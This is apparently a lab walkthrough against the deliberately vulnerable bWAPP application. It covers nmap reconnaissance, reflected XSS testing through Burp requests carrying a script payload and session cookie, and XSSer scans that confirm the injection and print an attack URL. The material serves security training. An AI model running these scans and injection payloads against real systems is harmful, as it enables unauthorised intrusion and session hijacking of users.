```
root@attackdefense:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
29544: eth0@if29545: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:00:06 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.6/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
29547: eth1@if29548: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:31:15:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.49.21.2/24 brd 192.49.21.255 scope global eth1
       valid_lft forever preferred_lft forever
root@attackdefense:~# ping -c 5 192.49.21.3
PING 192.49.21.3 (192.49.21.3) 56(84) bytes of data.
64 bytes from 192.49.21.3: icmp_seq=1 ttl=64 time=0.048 ms
64 bytes from 192.49.21.3: icmp_seq=2 ttl=64 time=0.046 ms
64 bytes from 192.49.21.3: icmp_seq=3 ttl=64 time=0.057 ms
64 bytes from 192.49.21.3: icmp_seq=4 ttl=64 time=0.045 ms
64 bytes from 192.49.21.3: icmp_seq=5 ttl=64 time=0.054 ms

--- 192.49.21.3 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4089ms
rtt min/avg/max/mdev = 0.045/0.050/0.057/0.004 ms
```

```
root@attackdefense:~# nmap 192.49.21.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-09-04 19:24 IST
Nmap scan report for target-1 (192.49.21.3)
Host is up (0.000010s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 02:42:C0:31:15:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

Open the browser and check for the live page for the webapp that is running on the port 80. Try to login to the bwapp application and them try to select the html injection refleced GET hack.

Enter the first name murari and last name murari and hit on go and see that getting reflected in the url of the page. Just to confirm if cross scripting in enabled we can try to include script tag inside the url and try to run some code like alert. If that works we can launch the burp suite and enable the foxy proxy and continue.
In the burp once we see the proxy tag we can see the request along with the cookie information and we can now forward it to the repeater tab and modify the request and see the various responses that we can get by sending the requests

```
GET /htmli_get.php?firstname=murari&lastname=nagendra&form=submit HTTP/1.1
Host: 192.49.21.3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=p5abgpl63pi6gjkcrppss6oh00; security_level=0
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

and we can analyse the response

Now let us try to send the script included request and see the response

```
GET /htmli_get.php?firstname=<script>alert(1);</script>&lastname=nagendra&form=submit HTTP/1.1
Host: 192.49.21.3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=p5abgpl63pi6gjkcrppss6oh00; security_level=0
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

```
<div id="main">
    
    <h1>HTML Injection - Reflected (GET)</h1>

    <p>Enter your first and last name:</p>

    <form action="/htmli_get.php" method="GET">

        <p><label for="firstname">First name:</label><br />
        <input type="text" id="firstname" name="firstname"></p>

        <p><label for="lastname">Last name:</label><br />
        <input type="text" id="lastname" name="lastname"></p>

        <button type="submit" name="form" value="submit">Go</button>  

    </form>

    <br />
    Welcome <script>alert(1);</script> nagendra
</div>
```

As we can see that the alert is reflected in the page.

```
root@attackdefense:~# xsser --url "http://192.49.21.3/htmli_get.php?firstname=XSS&lastname=nagendra&form=submit" --cookie="PHPSESSID=p5abgpl63pi6gjkcrppss6oh00; security_level=0"
===========================================================================

XSSer v1.8[2]: "The Hiv3!" - (https://xsser.03c8.net) - 2010/2019 -> by psy

===========================================================================
Testing [XSS from URL]...
===========================================================================
===========================================================================
[*] Test: [ 1/1 ] <-> 2023-09-04 19:48:06.944252
===========================================================================

[+] Target: 

 [ http://192.49.21.3/htmli_get.php?firstname=XSS&lastname=nagendra&form=submit ]

---------------------------------------------

[!] Hashing: 

 [ fbcaccc3800bc6d420a3fd4956dd2466 ] : [ firstname ]

---------------------------------------------

[*] Trying: 

http://192.49.21.3/htmli_get.php?firstname=%22%3Efbcaccc3800bc6d420a3fd4956dd2466&lastname=nagendra&form=submit

---------------------------------------------

[+] Vulnerable(s): 

 [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]

---------------------------------------------

=============================================
[*] Injection(s) Results:
=============================================

 [ FOUND! ] -> [ fbcaccc3800bc6d420a3fd4956dd2466 ] : [ firstname ] -> [ ">PAYLOAD ]

==================================================
Mosquito(es) landed!
==================================================

===========================================================================
[*] Final Results:
===========================================================================

- Injections: 1
- Failed: 0
- Successful: 1
- Accur: 100.0 %

===========================================================================
[*] List of XSS injections:
===========================================================================

You have found: [ 1 ] possible (without --reverse-check) XSS vector(s)!

---------------------

[+] Target: http://192.49.21.3/htmli_get.php?firstname=XSS&lastname=nagendra&form=submit
[+] Vector: [ firstname ]
[!] Method: URL
[*] Hash: fbcaccc3800bc6d420a3fd4956dd2466
[*] Payload: http://192.49.21.3/htmli_get.php?firstname=%22%3Efbcaccc3800bc6d420a3fd4956dd2466&lastname=nagendra&form=submit
[!] Vulnerable: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
[!] Status: XSS FOUND! 
 --------------------------------------------------
```

```
root@attackdefense:~# xsser --url "http://192.49.21.3/htmli_get.php?firstname=XSS&lastname=nagendra&form=submit" --cookie="PHPSESSID=p5abgpl63pi6gjkcrppss6oh00; security_level=0" --Fp "<script>alert(1)</script>"
===========================================================================

XSSer v1.8[2]: "The Hiv3!" - (https://xsser.03c8.net) - 2010/2019 -> by psy

===========================================================================
Testing [XSS from URL]...
===========================================================================
===========================================================================
[*] Test: [ 1/1 ] <-> 2023-09-04 19:49:27.502632
===========================================================================

[+] Target: 

 [ http://192.49.21.3/htmli_get.php?firstname=XSS&lastname=nagendra&form=submit ]

---------------------------------------------

[!] Hashing: 

 [ 5cb6f2ad7fe52fcb2c293e93c175cd7e ] : [ firstname ]

---------------------------------------------

[*] Trying: 

http://192.49.21.3/htmli_get.php?firstname=%22%3E5cb6f2ad7fe52fcb2c293e93c175cd7e&lastname=nagendra&form=submit

---------------------------------------------

[+] Vulnerable(s): 

 [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]

---------------------------------------------

=============================================
[*] Injection(s) Results:
=============================================

 [ FOUND! ] -> [ 5cb6f2ad7fe52fcb2c293e93c175cd7e ] : [ firstname ] -> [ ">PAYLOAD ]

==================================================
Mosquito(es) landed!
==================================================

===========================================================================
[*] Final Results:
===========================================================================

- Injections: 1
- Failed: 0
- Successful: 1
- Accur: 100.0 %

===========================================================================
[*] List of XSS injections:
===========================================================================

You have found: [ 1 ] possible (without --reverse-check) XSS vector(s)!

---------------------

[+] Target: http://192.49.21.3/htmli_get.php?firstname=XSS&lastname=nagendra&form=submit
[+] Vector: [ firstname ]
[!] Method: URL
[*] Hash: 5cb6f2ad7fe52fcb2c293e93c175cd7e
[*] Payload: http://192.49.21.3/htmli_get.php?firstname=%22%3E5cb6f2ad7fe52fcb2c293e93c175cd7e&lastname=nagendra&form=submit
[!] Vulnerable: [IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
[*] Final Attack: http://192.49.21.3/htmli_get.php?firstname=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&lastname=nagendra&form=submit
[!] Status: XSS FOUND! 
 --------------------------------------------------
```

